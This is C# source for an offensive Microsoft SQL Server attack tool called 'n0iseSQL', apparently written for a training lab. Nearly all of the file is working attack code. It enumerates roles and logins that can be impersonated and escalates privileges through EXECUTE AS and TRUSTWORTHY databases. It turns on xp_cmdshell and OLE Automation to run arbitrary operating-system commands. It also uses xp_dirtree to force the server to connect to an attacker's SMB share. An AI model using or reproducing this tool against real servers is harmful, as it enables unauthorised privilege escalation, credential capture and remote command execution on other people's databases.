using System;
using System.Data.SqlClient;

namespace n0iseSQL
{
    internal class Program
    {
        static void Main(string[] args)
        {

            if (args.Length < 3)
            {
                Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                Console.WriteLine();
                Console.WriteLine("actions:");
                Console.WriteLine("\tauthenticate");
                Console.WriteLine("\tconnectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                Console.WriteLine("\tenumLoginImpersonation");
                Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
                Console.WriteLine("\t\texample: impersonateLogin sa none");
                Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
                Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
                Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");

                
                return;
            }

            String action = args[2];

            if (action == "connectShare")
            {
                if (args.Length > 3)
                {
                    if (args[3].ToString().StartsWith("\\\\") == false)
                    {
                        Console.WriteLine("n0iseSQL.exe [sqlServer] [database] connectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                        return;
                    }
                }
                else
                {
                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] connectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                    return;
                }
            }

            if (action == "impersonateLogin")
            {
                if (args.Length < 5)
                {
                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
                    Console.WriteLine("\texample: impersonateLogin sa none");
                    Console.WriteLine("\texample: impersonateLogin sa xp_cmdshell whoami");
                    Console.WriteLine("\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");

                    return;
                } else
                {
                    if (args[4].ToString() != "none")
                    {
                        if (args.Length < 6)
                        {
                            Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
                            Console.WriteLine("\texample: impersonateLogin sa none");
                            Console.WriteLine("\texample: impersonateLogin sa xp_cmdshell whoami");
                            Console.WriteLine("\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
                            return;
                        }
                    }
                }
            }

            if (action == "impersonateUser")
            {
                if (args.Length < 5)
                {
                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
                    return;
                }
            }



            //String sqlServer = "data.cyber-rangers.lab";
            String sqlServer = args[0];
            //String database = "master";
            String database = args[1];

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            Console.WriteLine("[+] Connecting to sqlServer {0} to database {1}", sqlServer, database);
            try
            {
                con.Open();
                Console.WriteLine("{+] Authentication succeeded");
            }
            catch
            {
                Console.WriteLine("[!] Authentication failed");
                Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;"; 
            SqlCommand command = new SqlCommand(querylogin, con); 
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Logged in as: " + reader[0]); 
            reader.Close();

            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Mapped to user: " + reader[0]); //pokud Guest tak ten user nema primo login v ramci SQL
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');"; 
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString()); if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[+] User is NOT a member of public role");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString()); if (role == 1)
            {
                Console.WriteLine("[+] User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("[+] User is NOT a member of sysadmin role");
            }
            reader.Close();

            if (action == "connectShare")
            {
                String smbShare = args[3].ToString();
                //pristup k SMB sharu utocnika
                Console.WriteLine("[+] Connecting to SMB share {0} using xp_dirtree...",smbShare);
                //String queryxpdirtree = "EXEC master..xp_dirtree \"\\\\10.10.10.113\\\\share\";";
                String queryxpdirtree = String.Format("EXEC master..xp_dirtree \"{0}\";", smbShare);
                //Console.WriteLine(queryxpdirtree);
                command = new SqlCommand(queryxpdirtree, con);
                try
                {
                    reader = command.ExecuteReader();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] {0}",ex.Message.ToString());
                }
                reader.Close();
            }

            if (action == "enumLoginImpersonation")
            {
                Console.WriteLine("[+] Enumerating logins that can be impersonated...");
                String queryImpersonation = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ";
                command = new SqlCommand(queryImpersonation, con);
                reader = command.ExecuteReader();
                while (reader.Read() == true)
                {
                    Console.WriteLine("[+] Logins that can be impersonated: " + reader[0]);
                }
                reader.Close();
            }


            if (action == "impersonateLogin")
            {
                
                String execType = args[4].ToString();
                String loginToImpersonate = args[3].ToString();
                Console.WriteLine("[+] Impersonating login: {0}",loginToImpersonate);
                String executeas = String.Format("EXECUTE AS LOGIN = '{0}';",loginToImpersonate);
                command = new SqlCommand(executeas, con);
                try
                {
                    reader = command.ExecuteReader();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] {0}", ex.Message.ToString());
                }
                reader.Close();

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[+] Now executing code as: " + reader[0]);
                reader.Close();

                if (execType == "xp_cmdshell")
                {
                    String commandToExecute = args[5].ToString();
                    Console.WriteLine("Command executing using xp_cmdshell: {0}", commandToExecute);
                    String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
                    String execCmd = String.Format("EXEC xp_cmdshell {0}",commandToExecute);

                    command = new SqlCommand(enable_xpcmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("[+] Result of command is: " + reader[0]);
                    reader.Close();
                }

                if (execType == "sp_oa")
                {
                    String commandToExecute = args[5].ToString();
                    Console.WriteLine("Command executing using sp_oacreate and sp_oamethod: {0}", commandToExecute);
                    String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ";
                    //String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Temp\\file.txt\"';";
                    String execCmd = String.Format("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"';",commandToExecute);

                    command = new SqlCommand(enable_ole, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                }

            }

            if (action == "impersonateUser")
            {
                String userToImpersonate = args[4].ToString();
                String trustworthyDatabase = args[3].ToString();
                Console.WriteLine("[+] Impersonating user: {0}", userToImpersonate);
                Console.WriteLine("[+] Database with TRUSTWORTHY enabled: {0}", trustworthyDatabase);

                String executeasUser = String.Format("use {0}; EXECUTE AS USER = '{1}';", trustworthyDatabase, userToImpersonate);
                command = new SqlCommand(executeasUser, con);
                try
                {
                    reader = command.ExecuteReader();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] {0}", ex.Message.ToString());
                }
                reader.Close();

                command = new SqlCommand(queryuser, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[+] Now executing code as: " + reader[0]);
                reader.Close();
            }

            Console.WriteLine("[+] Done!");
            con.Close();
        }
    }
}
